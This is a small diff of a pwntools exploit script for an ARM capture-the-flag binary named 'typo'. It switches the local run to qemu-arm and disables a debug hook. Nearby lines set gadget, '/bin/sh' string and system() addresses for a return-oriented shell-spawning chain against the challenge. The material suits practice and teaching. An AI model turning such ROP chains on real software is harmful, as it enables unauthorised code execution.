@@ -13,10 +13,10 @@ def DEBUG():
     raw_input("DEBUG: ")
     gdb.attach(io, arch = "arm")
 
-io = process("./typo")
+io = process(["qemu-arm", "./typo"])
 #  io = remote("pwn2.jarvisoj.com", 9888)
 io.sendlineafter("quit\n", "\n")
-DEBUG()
+#  DEBUG()
 pop_r0_r4_pc = 0x00020904
 sh_addr = 0x0006c384
 system_addr = 0x110B4
